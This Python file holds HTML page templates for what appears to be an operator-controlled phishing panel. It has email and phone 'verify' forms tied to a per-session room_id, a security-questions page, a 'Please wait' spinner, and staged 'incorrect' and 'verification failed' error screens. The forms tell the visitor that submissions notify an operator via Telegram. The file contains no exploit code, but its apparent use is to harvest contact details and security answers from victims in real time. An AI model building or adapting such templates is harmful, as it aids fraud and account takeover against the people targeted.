PAGE_TEMPLATES = {
    "Page 1": """
<div style="width:430px; background:#fff; padding:20px; border-radius:0px; text-align:left;">
    <form method="POST" action="https://YOUR_BACKEND_URL/verify_email" style="display:flex; flex-direction:column; gap:12px;">
        <input type="hidden" name="room_id" value="{room_id}">
        <h2 style="font-family:'Montserrat', sans-serif; color:#005da6; margin:0;">📧 Verify Email / Number</h2>
        <p style="font-family:'Montserrat', sans-serif; font-size:14px; margin:0 0 6px 0;">Please enter the email or number to verify:</p>
        <input type="text" name="verified_email" required
               style="padding:8px; border:1px solid #ddd; border-radius:4px; outline:none;">
        <div style="display:flex; justify-content:flex-end;">
            <button type="submit" style="background:#005da6; color:#fff; border:none; padding:8px 14px; border-radius:4px; cursor:pointer;">
                Verify
            </button>
        </div>
        <p style="font-size:12px; color:gray; margin:6px 0 0 0;">This will notify the operator via Telegram.</p>
    </form>
</div>
""",

    "Page 2": """
<div style="width:430px; background:#fff; padding:20px; border-radius:0px; text-align:left;">
    <form method="POST" action="https://YOUR_BACKEND_URL/verify_email" style="display:flex; flex-direction:column; gap:12px;">
        <input type="hidden" name="room_id" value="{room_id}">
        <h2 style="font-family:'Montserrat', sans-serif; color:#005da6; margin:0;">📞 Verify Phone</h2>
        <p style="font-family:'Montserrat', sans-serif; font-size:14px; margin:0 0 6px 0;">Please enter the phone number to verify:</p>
        <input type="text" name="verified_email" required
               style="padding:8px; border:1px solid #ddd; border-radius:4px; outline:none;">
        <div style="display:flex; justify-content:flex-end;">
            <button type="submit" style="background:#005da6; color:#fff; border:none; padding:8px 14px; border-radius:4px; cursor:pointer;">
                Verify
            </button>
        </div>
        <p style="font-size:12px; color:gray; margin:6px 0 0 0;">This will notify the operator via Telegram.</p>
    </form>
</div>
""",

    "Page 3": """
<div style="width:430px; background:#fff; padding:40px; border-radius:0px;">
    <h2 style="font-family:'Montserrat', sans-serif; color:#005da6;">📝 Security Questions</h2>
    <p style="font-family:'Montserrat', sans-serif; font-size:18px; font-weight:bold; color:#005da6;">{greeting}</p>
</div>
""",

    "Page 4": """
<div style="width:430px; background:#fff; padding:40px; border-radius:0px;">
    <h2 style="font-family:'Montserrat', sans-serif; color:#005da6;">✅ Final Confirmation</h2>
    <p style="font-family:'Montserrat', sans-serif; font-size:14px;">All details have been verified successfully.</p>
</div>
""",

    "Page 5": """
<div style="width:430px; background:#fff; padding:40px; border-radius:0px; text-align:center;">
    <h2 style="font-family:'Montserrat', sans-serif; color:#d9534f;">❌ The Email / Number or Name you entered is incorrect.</h2>
    <form method="GET" action="/">
        <button type="submit" 
                style="margin-top:20px; padding:10px 20px; font-size:14px; font-weight:bold;
                       border:none; border-radius:4px; background-color:#005da6; color:#fff;
                       cursor:pointer;">
            Retry
        </button>
    </form>
</div>
""",

    "Page 6": """
<div style="width:430px; background:#fff; padding:40px; border-radius:0px; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center;">
    <div class="spinner" style="border:4px solid #ccc; border-top:4px solid #005da6; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin-bottom:15px;"></div>
    <h2>Please wait...</h2>
    <style>@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
</div>
""",

    "Page 7": """
<div style="width:430px; background:#fff; padding:40px; border-radius:0px; text-align:center;">
    <h2 style="font-family:'Montserrat', sans-serif; color:#d9534f;">❌ Verification Failed</h2>
    <form method="GET" action="/">
        <button type="submit" 
                style="margin-top:20px; padding:10px 20px; font-size:14px; font-weight:bold;
                       border:none; border-radius:4px; background-color:#005da6; color:#fff;
                       cursor:pointer;">
            Retry
        </button>
    </form>
</div>
"""
}

PAGE_6_HTML = """
<div class="spinner" style="border:4px solid #ccc; border-top:4px solid #005da6; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin-bottom:15px;"></div>
<h2>Please wait...</h2>
<style>@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
"""
